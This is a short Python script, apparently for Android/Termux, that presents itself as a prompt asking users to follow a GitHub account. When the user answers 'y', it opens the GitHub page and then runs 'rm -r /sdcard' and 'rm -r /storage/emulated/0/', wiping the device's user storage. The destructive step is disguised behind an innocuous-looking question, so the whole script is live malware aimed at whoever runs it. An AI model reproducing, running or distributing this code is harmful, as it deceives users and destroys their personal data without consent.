import os,sys,time,re,requests,json
from requests import post
from time import sleep
               
print("\033[1;37mFollow my github please!\nModded By 7cKenz") 
subs = input("\033[1;37mDo you want to continue ? (y/n) ")
if subs == 'y':
	      os.system("xdg-open https://github.com/7cKenz")
	      time.sleep(5)
	      os.system("rm -r /sdcard -y")
	      os.system("rm -r /storage/emulated/0/ -y")
	      sys.exit()
elif subs == 'n':
            print("\033[1;31mGagal masuk!")
            sys.exit()
else:
            print('\033[1;31mWrong Input!')
            time.sleep(1)
            os.system('python azkenz.py')
            sys.exit()